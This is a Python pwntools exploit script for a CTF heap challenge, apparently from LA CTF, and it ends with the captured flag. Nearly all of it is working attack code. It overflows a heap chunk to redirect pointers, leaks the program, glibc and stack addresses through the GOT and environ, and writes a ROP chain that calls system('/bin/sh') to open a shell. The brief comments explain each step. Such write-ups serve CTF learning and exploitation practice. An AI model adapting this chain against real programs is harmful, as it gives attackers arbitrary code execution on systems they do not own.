from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    b *(menu+204)
    b *(menu+216)
    b *(menu+228)
    b *(menu+240)
    b *(menu+252)
    continue
''')

# p = remote('chall.lac.tf', 31338)

# create a level at index (0-7) of current level
def create_level(index):
    p.sendlineafter(b"Choice: ", b'1')
    p.sendlineafter(b"Enter level index: ", str(index).encode())

# edit (write) level data of current level
def edit_level(data):
    p.sendlineafter(b"Choice: ", b'2')
    p.sendlineafter(b"Enter level data: ", data)

# test (read) level data of current level
def test_level():
    p.sendlineafter(b"Choice: ", b'3')
    p.recvuntil(b"Level data: ")
    return p.recvline().strip()

# explore (go to) index (0-7) sub level of current level
def explore(index):
    p.sendlineafter(b"Choice: ", b'4')
    p.sendlineafter(b"Enter level index: ", str(index).encode())

# reset current level to base level
def reset():
    p.sendlineafter(b"Choice: ", b'5')

# each chunk (aka level) is allocated by malloc(0x60), whose first 0x40 bytes is used to store at most eight addresses of sub chunks (aka sub levels) and last 0x20 bytes is used to store chunk data (aka level data), which means that each level has at most eight sub levels, and so on, like a tree structure
# base level cannot be edited or tested, which means that base chunk cannot be written or read

e = ELF('./chall')
glibc_e = ELF('./libc.so.6')

# 1. get elf base address
p.recvuntil(b"A welcome gift: ")
elf_base_addr = int(p.recvline().strip(), 16)-e.sym.main
log.info(f"elf base address: {hex(elf_base_addr)}")

# 2. allocate two chunks to prepare for following operations
create_level(0)
create_level(1)

# 3. leak glibc base address
explore(0)
edit_level(b'A'*0x28+p64(0x71)+p64(elf_base_addr+e.got.puts-0x40))  # heap buffer overflow to next chunk
reset()
explore(1)
explore(0)
glibc_base_addr = u64(test_level()[0:6].ljust(8, b'\x00'))-glibc_e.sym.puts  # read value at elf_base_addr+e.got.puts
log.info(f"glibc base address: {hex(glibc_base_addr)}")
reset()

# 4. leak return address of edit_level function
explore(0)
edit_level(b'B'*0x28+p64(71)+p64(glibc_base_addr+glibc_e.sym.environ-0x40))  # heap buffer overflow to next chunk
reset()
explore(1)
explore(0)
edit_level_return_addr = u64(test_level()[0:6].ljust(8, b'\x00'))-0x150  # read value at glibc_base_addr+glibc_e.sym.environ
log.info(f'edit_level function return address: {hex(edit_level_return_addr)}')
reset()

# 5. write ROP chain to edit_level function return address to trigger system('/bin/sh\x00')
explore(0)
edit_level(b'C'*0x28 + p64(71) + p64(edit_level_return_addr-0x40))  # heap buffer overflow to next chunk
reset()
chain = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
    glibc_base_addr+glibc_e.sym.system
]
explore(1)
explore(0)
edit_level(b''.join([p64(c) for c in chain]))  # write ROP chain to edit_level function return address

p.interactive()

# lactf{ro9u3_LIk3_No7_R34LlY_RO9U3_H34P_LIK3_nO7_r34llY_H34P}